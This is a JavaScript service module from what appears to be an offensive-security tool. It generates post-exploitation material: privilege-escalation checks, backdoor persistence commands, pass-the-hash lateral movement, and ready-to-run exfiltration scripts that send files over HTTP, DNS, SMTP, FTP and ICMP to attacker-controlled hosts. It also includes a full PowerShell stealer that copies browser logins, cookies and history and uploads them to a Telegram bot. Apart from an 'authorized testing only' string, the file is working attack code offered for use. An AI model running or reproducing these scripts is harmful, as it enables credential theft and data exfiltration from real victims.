import { logger } from '../config/logger.js';
import { AppError } from '../middleware/errorHandler.js';

export class PostExploitationService {
  async privilegeEscalation(platform, method = 'auto') {
    try {
      logger.info(`Generating privilege escalation for ${platform}`);
      
      const techniques = {
        linux: [
          {
            name: 'SUID Binary Exploitation',
            command: 'find / -perm -u=s -type f 2>/dev/null',
            description: 'Find SUID binaries that can be exploited',
            difficulty: 'MEDIUM'
          },
          {
            name: 'Kernel Exploit',
            command: 'uname -r && cat /etc/issue',
            description: 'Check kernel version for known exploits',
            difficulty: 'HIGH'
          },
          {
            name: 'Sudo Misconfiguration',
            command: 'sudo -l',
            description: 'Check for sudo privileges',
            difficulty: 'LOW'
          },
          {
            name: 'Cron Jobs',
            command: 'cat /etc/crontab && ls -la /etc/cron.*',
            description: 'Check for writable cron jobs',
            difficulty: 'MEDIUM'
          }
        ],
        windows: [
          {
            name: 'UAC Bypass',
            command: 'whoami /priv',
            description: 'Check current privileges for UAC bypass',
            difficulty: 'MEDIUM'
          },
          {
            name: 'Token Impersonation',
            command: 'whoami /all',
            description: 'Check available tokens for impersonation',
            difficulty: 'HIGH'
          },
          {
            name: 'Unquoted Service Path',
            command: 'wmic service get name,displayname,pathname,startmode',
            description: 'Find services with unquoted paths',
            difficulty: 'MEDIUM'
          },
          {
            name: 'AlwaysInstallElevated',
            command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
            description: 'Check for AlwaysInstallElevated policy',
            difficulty: 'LOW'
          }
        ]
      };

      return {
        platform,
        method,
        techniques: techniques[platform.toLowerCase()] || [],
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Privilege escalation failed: ${error.message}`);
      throw new AppError(`Privilege escalation failed: ${error.message}`, 500);
    }
  }

  async persistenceTechniques(platform) {
    try {
      logger.info(`Generating persistence techniques for ${platform}`);
      
      const techniques = {
        linux: [
          {
            name: 'Cron Job',
            command: '(crontab -l ; echo "@reboot /tmp/backdoor.sh")| crontab -',
            description: 'Add backdoor to crontab',
            stealth: 'MEDIUM'
          },
          {
            name: 'SSH Key',
            command: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',
            description: 'Add SSH public key',
            stealth: 'HIGH'
          },
          {
            name: 'Systemd Service',
            command: 'Create malicious systemd service',
            description: 'Create persistent systemd service',
            stealth: 'LOW'
          }
        ],
        windows: [
          {
            name: 'Registry Run Key',
            command: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe',
            description: 'Add backdoor to registry run key',
            stealth: 'LOW'
          },
          {
            name: 'Scheduled Task',
            command: 'schtasks /create /tn "UpdateTask" /tr C:\\backdoor.exe /sc onlogon',
            description: 'Create scheduled task for persistence',
            stealth: 'MEDIUM'
          },
          {
            name: 'WMI Event Subscription',
            command: 'Create WMI event subscription',
            description: 'Use WMI for stealthy persistence',
            stealth: 'HIGH'
          }
        ]
      };

      return {
        platform,
        techniques: techniques[platform.toLowerCase()] || [],
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Persistence techniques failed: ${error.message}`);
      throw new AppError(`Persistence techniques failed: ${error.message}`, 500);
    }
  }

  buildHTTPExfiltrationScript(options = {}) {
    const server = options.server || 'http://attacker.com:8080';
    const dataPath = options.dataPath || '/tmp/sensitive_data.txt';
    const chunkSize = options.chunkSize || 1048576; // 1MB chunks
    
    return `#!/bin/bash
# HTTP Data Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Server: ${server}
# WARNING: FOR AUTHORIZED TESTING ONLY

SERVER="${server}"
DATA_PATH="${dataPath}"
CHUNK_SIZE=${chunkSize}
SESSION_ID=$(uname -n)-$(date +%s)

echo "[+] Starting HTTP exfiltration..."
echo "[+] Target: $DATA_PATH"
echo "[+] Server: $SERVER"
echo "[+] Session: $SESSION_ID"

# Function to exfiltrate file
exfiltrate_file() {
    local file="$1"
    local filename=$(basename "$file")
    
    if [ ! -f "$file" ]; then
        echo "[-] File not found: $file"
        return 1
    fi
    
    local filesize=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    echo "[+] File size: $filesize bytes"
    
    # Split into chunks if large
    if [ $filesize -gt $CHUNK_SIZE ]; then
        echo "[+] Splitting into chunks..."
        local chunks=$(($filesize / $CHUNK_SIZE + 1))
        
        for i in $(seq 0 $(($chunks - 1))); do
            local offset=$(($i * $CHUNK_SIZE))
            echo "[+] Sending chunk $((i+1))/$chunks..."
            
            dd if="$file" bs=$CHUNK_SIZE skip=$i count=1 2>/dev/null | \\
            base64 | \\
            curl -X POST \\
                -H "Content-Type: application/json" \\
                -H "X-Session-ID: $SESSION_ID" \\
                -H "X-Filename: $filename" \\
                -H "X-Chunk: $i" \\
                -H "X-Total-Chunks: $chunks" \\
                -d @- \\
                "$SERVER/upload" \\
                -s -o /dev/null
            
            if [ $? -eq 0 ]; then
                echo "[+] Chunk $((i+1)) sent successfully"
            else
                echo "[-] Failed to send chunk $((i+1))"
            fi
        done
    else
        # Send entire file
        echo "[+] Sending file..."
        base64 "$file" | \\
        curl -X POST \\
            -H "Content-Type: application/json" \\
            -H "X-Session-ID: $SESSION_ID" \\
            -H "X-Filename: $filename" \\
            -d @- \\
            "$SERVER/upload" \\
            -s -o /dev/null
        
        if [ $? -eq 0 ]; then
            echo "[+] File sent successfully"
        else
            echo "[-] Failed to send file"
        fi
    fi
}

# Function to exfiltrate directory
exfiltrate_directory() {
    local dir="$1"
    
    if [ ! -d "$dir" ]; then
        echo "[-] Directory not found: $dir"
        return 1
    fi
    
    echo "[+] Creating archive..."
    local archive="/tmp/exfil_$(date +%s).tar.gz"
    tar czf "$archive" -C "$(dirname "$dir")" "$(basename "$dir")" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Archive created: $archive"
        exfiltrate_file "$archive"
        rm -f "$archive"
    else
        echo "[-] Failed to create archive"
    fi
}

# Main execution
if [ -f "$DATA_PATH" ]; then
    exfiltrate_file "$DATA_PATH"
elif [ -d "$DATA_PATH" ]; then
    exfiltrate_directory "$DATA_PATH"
else
    echo "[-] Path not found: $DATA_PATH"
    exit 1
fi

echo "[+] Exfiltration complete"`;
  }

  buildDNSExfiltrationScript(options = {}) {
    const domain = options.domain || 'attacker.com';
    const dataPath = options.dataPath || '/etc/passwd';
    
    return `#!/bin/bash
# DNS Tunneling Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Domain: ${domain}
# WARNING: FOR AUTHORIZED TESTING ONLY

DOMAIN="${domain}"
DATA_PATH="${dataPath}"
CHUNK_SIZE=63  # Max DNS label length

echo "[+] Starting DNS exfiltration..."
echo "[+] Data: $DATA_PATH"
echo "[+] Domain: $DOMAIN"

# Function to exfiltrate via DNS
dns_exfil() {
    local data="$1"
    local session_id=$(echo $RANDOM | md5sum | cut -c1-8)
    
    # Base64 encode and split into DNS-safe chunks
    local encoded=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local total_length=\${#encoded}
    local chunks=$(( ($total_length + $CHUNK_SIZE - 1) / $CHUNK_SIZE ))
    
    echo "[+] Total chunks: $chunks"
    
    # Send start marker
    dig "start.$session_id.$DOMAIN" +short > /dev/null 2>&1
    sleep 0.5
    
    # Send data chunks
    local pos=0
    local chunk_num=0
    while [ $pos -lt $total_length ]; do
        local chunk=\${encoded:$pos:$CHUNK_SIZE}
        local query="$chunk_num.$chunk.$session_id.$DOMAIN"
        
        echo "[+] Sending chunk $chunk_num..."
        dig "$query" +short > /dev/null 2>&1
        
        pos=$((pos + $CHUNK_SIZE))
        chunk_num=$((chunk_num + 1))
        sleep 0.2  # Rate limiting
    done
    
    # Send end marker
    dig "end.$chunks.$session_id.$DOMAIN" +short > /dev/null 2>&1
    echo "[+] Transmission complete"
}

# Read and exfiltrate data
if [ -f "$DATA_PATH" ]; then
    echo "[+] Reading file..."
    
    # Split large files
    if [ $(stat -f%z "$DATA_PATH" 2>/dev/null || stat -c%s "$DATA_PATH" 2>/dev/null) -gt 10240 ]; then
        echo "[+] Large file detected, splitting..."
        local line_num=0
        while IFS= read -r line; do
            dns_exfil "$line"
            line_num=$((line_num + 1))
            [ $((line_num % 10)) -eq 0 ] && echo "[+] Processed $line_num lines"
        done < "$DATA_PATH"
    else
        # Send entire file
        local data=$(cat "$DATA_PATH")
        dns_exfil "$data"
    fi
    
    echo "[+] Exfiltration complete"
else
    echo "[-] File not found: $DATA_PATH"
    exit 1
fi`;
  }

  buildTelegramStealerScript(options = {}) {
    const botToken = options.botToken || 'YOUR_BOT_TOKEN_HERE';
    const chatId = options.chatId || 'YOUR_CHAT_ID_HERE';
    
    // Read the base telegram script
    const fs = require('fs');
    const path = require('path');
    const templatePath = path.join(__dirname, '../../templates/telegram-stealer.ps1');
    
    // If template exists, use it; otherwise generate inline
    let script;
    try {
      script = fs.readFileSync(templatePath, 'utf8');
      // Replace placeholders
      script = script.replace(/\$T36R_TelegramBotToken\s*=\s*"[^"]*"/, `$T36R_TelegramBotToken = "${botToken}"`);
      script = script.replace(/\$T36R_TelegramChatId\s*=\s*"[^"]*"/, `$T36R_TelegramChatId   = "${chatId}"`);
    } catch (error) {
      // Generate inline if template not found
      script = `#requires -Version 5.1
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

#region CONFIGURATION
[string]$T36R_TelegramBotToken = "${botToken}"
[string]$T36R_TelegramChatId   = "${chatId}"
#endregion

#region CORE LOGIC & SETUP
$global:T36R_IsAdmin    = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$global:T36R_ScriptPath = if ($MyInvocation.MyCommand.CommandType -eq 'ExternalScript') { $MyInvocation.MyCommand.Path } else { $PSCommandPath }
$global:T36R_TempDir    = Join-Path $env:TEMP "wdat-$(Get-Random -Minimum 10000 -Maximum 99999)"
$global:T36R_UniqueId   = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME$env:USERNAME"))).Replace('-','').Substring(0,12)
$global:T36R_OutputDir  = Join-Path $T36R_TempDir "data"
$global:T36R_ZipPath    = Join-Path $env:TEMP "exfil_$T36R_UniqueId"
$global:T36R_DebugLog   = Join-Path $T36R_TempDir "debug.log"
$global:T36R_LogPath    = $T36R_DebugLog

# Create output directories
New-Item -Path $T36R_TempDir -ItemType Directory -Force | Out-Null
New-Item -Path $T36R_OutputDir -ItemType Directory -Force | Out-Null

function Write-DebugLog([string]$Message){
    try {
        $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logMessage = "$ts - $Message"
        if (Test-Path (Split-Path $T36R_DebugLog -Parent)) {
            $logMessage | Out-File -FilePath $T36R_DebugLog -Append -Encoding utf8 -ErrorAction SilentlyContinue
        }
        Write-Host $logMessage -ForegroundColor Green
    } catch {}
}

function Send-Telegram([string]$Text, [string]$FilePath=$null){
    $api = "https://api.telegram.org/bot$T36R_TelegramBotToken/"
    $retries=3
    
    if([string]::IsNullOrWhiteSpace($Text)) { $Text = "Data Update" }
    $Text = $Text -replace '[^\\x20-\\x7E\\r\\n]', ''
    if($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "..." }
    
    while($retries-- -gt 0){
        try{
            if($FilePath -and (Test-Path $FilePath)){
                $fileSize = (Get-Item $FilePath).Length
                $fileSizeMB = [Math]::Round($fileSize/1MB,2)
                
                if($fileSize -gt 50MB -or $fileSize -eq 0){
                    Write-DebugLog "File size issue: $fileSizeMB MB"
                    return $false
                }
                
                # Use curl if available
                $curlPath = Get-Command curl.exe -ErrorAction SilentlyContinue
                if($curlPath) {
                    $uri = "$\{api\}sendDocument"
                    $safeCaption = $Text -replace '"', '\\\\"'
                    $curlArgs = @("-X", "POST", "-F", "chat_id=$T36R_TelegramChatId", "-F", "caption=$safeCaption", "-F", "document=@\`"$FilePath\`"", $uri)
                    $null = & curl.exe @curlArgs 2>&1
                    if($LASTEXITCODE -eq 0) {
                        Write-DebugLog "File uploaded via curl"
                        return $true
                    }
                }
                
                # Fallback to Invoke-RestMethod
                $uri = "$\{api\}sendDocument"
                $form = @{
                    chat_id = $T36R_TelegramChatId
                    caption = $Text
                    document = Get-Item -LiteralPath $FilePath
                }
                Invoke-RestMethod -Uri $uri -Method Post -Form $form -TimeoutSec 600 | Out-Null
                Write-DebugLog "File uploaded"
            }else{
                $payload = @{ chat_id = [string]$T36R_TelegramChatId; text = $Text } | ConvertTo-Json
                Invoke-RestMethod -Uri ($api+"sendMessage") -Method Post -Body $payload -ContentType "application/json; charset=utf-8" -TimeoutSec 120 | Out-Null
            }
            return $true
        }catch{
            Write-DebugLog "Send failed: $($_.Exception.Message)"
            if($retries -eq 0){ return $false }
            Start-Sleep 2
        }
    }
    return $false
}

function Invoke-BrowserSteal {
    param([string]$OutDir)
    
    Write-DebugLog "Collecting browser data..."
    
    $browsers = @{
        'Chrome' = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"
        'Edge' = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"
        'Brave' = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"
        'Opera' = "$env:APPDATA\\Opera Software\\Opera Stable"
    }
    
    foreach($browser in $browsers.Keys){
        $path = $browsers[$browser]
        if(Test-Path $path){
            $dest = Join-Path $OutDir "Browsers\\$browser"
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            
            # Copy Login Data, Cookies, History
            @('Login Data', 'Cookies', 'History', 'Web Data') | ForEach-Object {
                $file = Get-ChildItem -Path $path -Filter $_ -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if($file){
                    Copy-Item $file.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied $browser $_"
                }
            }
        }
    }
}

function Invoke-SystemInfo {
    param([string]$OutDir)
    
    Write-DebugLog "Collecting system information..."
    
    $info = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        IsAdmin = $T36R_IsAdmin
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress
        InstalledSoftware = (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 50)
        Timestamp = (Get-Date).ToString('o')
    }
    
    $info | ConvertTo-Json -Depth 3 | Out-File (Join-Path $OutDir "SystemInfo.json") -Encoding UTF8
    Write-DebugLog "System info collected"
}

function New-SimpleZip {
    param([string]$SourceDir, [string]$ZipPath)
    
    Write-DebugLog "Creating archive..."
    
    try {
        # Compress to zip
        $zipFile = "$ZipPath.zip"
        Compress-Archive -Path "$SourceDir\\*" -DestinationPath $zipFile -CompressionLevel Optimal -Force
        
        # Check if file is too large for Telegram (50MB limit)
        $size = (Get-Item $zipFile).Length
        if($size -gt 48MB) {
            Write-DebugLog "Archive too large, will split..."
            # For simplicity, return the single file and let caller handle
            # In production, implement split logic here
        }
        
        return @($zipFile)
    } catch {
        Write-DebugLog "Archive failed: $($_.Exception.Message)"
        return @()
    }
}

function Invoke-Cleanup {
    try {
        Write-DebugLog "Cleaning up..."
        if(Test-Path $T36R_TempDir){ Remove-Item $T36R_TempDir -Recurse -Force -ErrorAction SilentlyContinue }
        if(Test-Path "$T36R_ZipPath*"){ Remove-Item "$T36R_ZipPath*" -Force -ErrorAction SilentlyContinue }
    } catch {}
}

# MAIN EXECUTION
try {
    Write-DebugLog "=== STARTING DATA COLLECTION ==="
    Send-Telegram "üîÑ Data collection started on $env:COMPUTERNAME"
    
    # Collect data
    Invoke-SystemInfo -OutDir $T36R_OutputDir
    Invoke-BrowserSteal -OutDir $T36R_OutputDir
    
    # Check collected data
    $collectedFiles = Get-ChildItem $T36R_OutputDir -Recurse -File -ErrorAction SilentlyContinue
    $totalSize = ($collectedFiles | Measure-Object -Property Length -Sum).Sum
    $totalSizeMB = [Math]::Round($totalSize / 1MB, 2)
    
    Write-DebugLog "Collected: $($collectedFiles.Count) files, $totalSizeMB MB"
    
    if($collectedFiles.Count -gt 0) {
        $zips = New-SimpleZip -SourceDir $T36R_OutputDir -ZipPath $T36R_ZipPath
        
        if($zips -and $zips.Count -gt 0) {
            foreach($zip in $zips) {
                if(Test-Path $zip) {
                    $zipSize = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
                    $success = Send-Telegram -Text "üì¶ Data package ($zipSize MB)" -FilePath $zip
                    if($success) {
                        Write-DebugLog "Transmitted: $zip"
                    }
                }
            }
            
            Send-Telegram "‚úÖ Data collection completed"
        }
    } else {
        Write-DebugLog "No data collected"
        Send-Telegram "‚ö†Ô∏è No data collected"
    }
    
} catch {
    Write-DebugLog "Error: $($_.Exception.Message)"
    Send-Telegram "‚ùå Error: $($_.Exception.Message)"
} finally {
    Invoke-Cleanup
}
#endregion`;
    }
    
    return script;
  }

  buildPowerShellExfiltrationScript(options = {}) {
    const server = options.server || 'http://attacker.com:8080';
    const dataPath = options.dataPath || 'C:\\Users\\*\\Documents\\*.docx';
    
    return `# PowerShell Data Exfiltration Script
# Generated: ${new Date().toISOString()}
# Target Server: ${server}
# WARNING: FOR AUTHORIZED TESTING ONLY

$server = "${server}"
$dataPath = "${dataPath}"
$sessionId = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

Write-Host "[+] Starting PowerShell exfiltration..."
Write-Host "[+] Target: $dataPath"
Write-Host "[+] Server: $server"
Write-Host "[+] Session: $sessionId"

# Function to exfiltrate file
function Exfiltrate-File {
    param(
        [string]$FilePath,
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        if (!(Test-Path $FilePath)) {
            Write-Host "[-] File not found: $FilePath"
            return $false
        }
        
        $fileName = Split-Path $FilePath -Leaf
        $fileSize = (Get-Item $FilePath).Length
        Write-Host "[+] File: $fileName ($fileSize bytes)"
        
        # Read file as base64
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
        
        # Create metadata
        $metadata = @{
            sessionId = $SessionId
            fileName = $fileName
            fileSize = $fileSize
            computerName = $env:COMPUTERNAME
            userName = $env:USERNAME
            timestamp = (Get-Date).ToString('o')
            data = $fileBase64
        } | ConvertTo-Json
        
        # Send to server
        $headers = @{
            "Content-Type" = "application/json"
            "X-Session-ID" = $SessionId
        }
        
        $response = Invoke-RestMethod -Uri "$Server/upload" \\
            -Method Post \\
            -Headers $headers \\
            -Body $metadata \\
            -UseBasicParsing \\
            -TimeoutSec 30
        
        Write-Host "[+] File uploaded successfully"
        return $true
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
        return $false
    }
}

# Function to exfiltrate multiple files
function Exfiltrate-Files {
    param(
        [string]$Pattern,
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        $files = Get-ChildItem -Path $Pattern -Recurse -File -ErrorAction SilentlyContinue
        $totalFiles = $files.Count
        $successCount = 0
        
        Write-Host "[+] Found $totalFiles files matching pattern"
        
        foreach ($file in $files) {
            Write-Host "[+] Processing: $($file.FullName)"
            
            if (Exfiltrate-File -FilePath $file.FullName -Server $Server -SessionId $SessionId) {
                $successCount++
            }
            
            # Rate limiting
            Start-Sleep -Milliseconds 500
        }
        
        Write-Host "[+] Exfiltrated $successCount / $totalFiles files"
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
}

# Function to exfiltrate system information
function Exfiltrate-SystemInfo {
    param(
        [string]$Server,
        [string]$SessionId
    )
    
    try {
        Write-Host "[+] Collecting system information..."
        
        $systemInfo = @{
            sessionId = $SessionId
            computerName = $env:COMPUTERNAME
            userName = $env:USERNAME
            domain = $env:USERDOMAIN
            osVersion = (Get-WmiObject Win32_OperatingSystem).Caption
            architecture = $env:PROCESSOR_ARCHITECTURE
            ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress
            installedSoftware = (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName -ne $null}).DisplayName
            timestamp = (Get-Date).ToString('o')
        } | ConvertTo-Json -Depth 3
        
        $headers = @{
            "Content-Type" = "application/json"
            "X-Session-ID" = $SessionId
            "X-Data-Type" = "SystemInfo"
        }
        
        Invoke-RestMethod -Uri "$Server/sysinfo" \\
            -Method Post \\
            -Headers $headers \\
            -Body $systemInfo \\
            -UseBasicParsing \\
            -TimeoutSec 30
        
        Write-Host "[+] System information sent"
        
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
}

# Main execution
try {
    # Exfiltrate system info first
    Exfiltrate-SystemInfo -Server $server -SessionId $sessionId
    
    # Exfiltrate files matching pattern
    Exfiltrate-Files -Pattern $dataPath -Server $server -SessionId $sessionId
    
    Write-Host "[+] Exfiltration complete"
    
} catch {
    Write-Host "[-] Fatal error: $($_.Exception.Message)"
    exit 1
}`;
  }

  buildSMTPExfiltrationScript(options = {}) {
    const smtpServer = options.smtpServer || 'smtp.gmail.com';
    const smtpPort = options.smtpPort || 587;
    const from = options.from || 'exfil@example.com';
    const to = options.to || 'attacker@example.com';
    const dataPath = options.dataPath || '/tmp/data.txt';
    
    return `#!/usr/bin/env python3
# SMTP Email Exfiltration Script
# Generated: ${new Date().toISOString()}
# SMTP Server: ${smtpServer}:${smtpPort}
# WARNING: FOR AUTHORIZED TESTING ONLY

import smtplib
import base64
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Configuration
SMTP_SERVER = "${smtpServer}"
SMTP_PORT = ${smtpPort}
FROM_EMAIL = "${from}"
TO_EMAIL = "${to}"
DATA_PATH = "${dataPath}"
SMTP_USER = "${options.smtpUser || 'user@example.com'}"
SMTP_PASS = "${options.smtpPass || 'password'}"

def exfiltrate_via_email(file_path):
    """Exfiltrate data via email"""
    try:
        print(f"[+] Reading file: {file_path}")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = f"Data Exfil - {os.path.basename(file_path)} - {datetime.now().strftime('%Y%m%d-%H%M%S')}"
        
        # Add body
        body = f"""
        Exfiltrated Data Report
        -----------------------
        Filename: {os.path.basename(file_path)}
        Size: {os.path.getsize(file_path)} bytes
        Timestamp: {datetime.now().isoformat()}
        Hostname: {os.uname().nodename}
        """
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach file
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
            msg.attach(part)
        
        # Send email
        print(f"[+] Connecting to {SMTP_SERVER}:{SMTP_PORT}...")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        
        print(f"[+] Authenticating...")
        server.login(SMTP_USER, SMTP_PASS)
        
        print(f"[+] Sending email...")
        server.send_message(msg)
        server.quit()
        
        print(f"[+] Data exfiltrated successfully via email")
        return True
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if os.path.exists(DATA_PATH):
        exfiltrate_via_email(DATA_PATH)
    else:
        print(f"[-] File not found: {DATA_PATH}")`;
  }

  async dataExfiltration(method = 'http', options = {}) {
    try {
      logger.info(`Generating data exfiltration script for ${method}`);
      
      let script;
      let format;
      let name;
      let description;
      
      switch(method.toLowerCase()) {
        case 'http':
        case 'https':
          script = this.buildHTTPExfiltrationScript(options);
          format = 'bash';
          name = 'HTTP POST Exfiltration';
          description = 'Exfiltrate data via HTTP POST with chunking support';
          break;
          
        case 'dns':
          script = this.buildDNSExfiltrationScript(options);
          format = 'bash';
          name = 'DNS Tunneling Exfiltration';
          description = 'Exfiltrate data via DNS queries (stealth method)';
          break;
          
        case 'powershell':
          script = this.buildPowerShellExfiltrationScript(options);
          format = 'powershell';
          name = 'PowerShell HTTP Exfiltration';
          description = 'Exfiltrate files via PowerShell with metadata';
          break;
          
        case 'smtp':
        case 'email':
          script = this.buildSMTPExfiltrationScript(options);
          format = 'python';
          name = 'SMTP Email Exfiltration';
          description = 'Exfiltrate data via email attachments';
          break;
          
        case 'ftp':
          script = `#!/bin/bash
# FTP Exfiltration Script
# Generated: ${new Date().toISOString()}

FTP_SERVER="${options.ftpServer || 'ftp.attacker.com'}"
FTP_USER="${options.ftpUser || 'anonymous'}"
FTP_PASS="${options.ftpPass || 'guest'}"
DATA_PATH="${options.dataPath || '/tmp/data.txt'}"

echo "[+] Starting FTP exfiltration..."
ftp -n $FTP_SERVER <<EOF
user $FTP_USER $FTP_PASS
binary
put $DATA_PATH
bye
EOF
echo "[+] Upload complete"`;
          format = 'bash';
          name = 'FTP Upload Exfiltration';
          description = 'Exfiltrate data via FTP upload';
          break;
          
        case 'icmp':
          script = `#!/bin/bash
# ICMP Tunneling Exfiltration
# Generated: ${new Date().toISOString()}
# Requires: hping3

TARGET="${options.target || 'attacker.com'}"
DATA_PATH="${options.dataPath || '/etc/passwd'}"

echo "[+] ICMP exfiltration to $TARGET"
hping3 -1 -d 1400 -E "$DATA_PATH" "$TARGET"`;
          format = 'bash';
          name = 'ICMP Tunneling';
          description = 'Exfiltrate data via ICMP packets';
          break;
          
        case 'telegram':
          script = this.buildTelegramStealerScript(options);
          format = 'powershell';
          name = 'Telegram Bot Exfiltration';
          description = 'Comprehensive data stealer exfiltrating via Telegram Bot (browser data, credentials, system info)';
          break;
          
        default:
          script = this.buildHTTPExfiltrationScript(options);
          format = 'bash';
          name = 'HTTP POST Exfiltration';
          description = 'Exfiltrate data via HTTP POST with chunking support';
      }

      return {
        method,
        name,
        description,
        script,
        format,
        options,
        usage: format === 'bash' ? 
          `Save as exfil.sh and execute:\n  chmod +x exfil.sh\n  ./exfil.sh` :
        format === 'powershell' ?
          `Save as exfil.ps1 and execute:\n  powershell -ExecutionPolicy Bypass -File exfil.ps1` :
          `Save as exfil.py and execute:\n  python3 exfil.py`,
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY. Unauthorized data exfiltration is illegal.'
      };
    } catch (error) {
      logger.error(`Data exfiltration failed: ${error.message}`);
      throw new AppError(`Data exfiltration failed: ${error.message}`, 500);
    }
  }

  async lateralMovement(network, technique = 'pass-the-hash') {
    try {
      logger.info(`Generating lateral movement techniques for ${network}`);
      
      const techniques = {
        'pass-the-hash': {
          name: 'Pass-the-Hash',
          tools: ['Mimikatz', 'CrackMapExec', 'Impacket'],
          command: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLMHASH',
          description: 'Use NTLM hash to authenticate to other systems'
        },
        'psexec': {
          name: 'PsExec',
          tools: ['PsExec', 'Impacket'],
          command: 'psexec.py domain/user:password@target',
          description: 'Execute commands on remote system'
        },
        'wmi': {
          name: 'WMI Execution',
          tools: ['wmiexec', 'CrackMapExec'],
          command: 'wmiexec.py domain/user:password@target',
          description: 'Execute commands via WMI'
        },
        'ssh': {
          name: 'SSH Key Reuse',
          tools: ['ssh'],
          command: 'ssh -i stolen_key user@target',
          description: 'Reuse stolen SSH keys'
        }
      };

      return {
        network,
        technique: techniques[technique] || techniques['pass-the-hash'],
        allTechniques: Object.keys(techniques),
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY'
      };
    } catch (error) {
      logger.error(`Lateral movement failed: ${error.message}`);
      throw new AppError(`Lateral movement failed: ${error.message}`, 500);
    }
  }
}

export default new PostExploitationService();
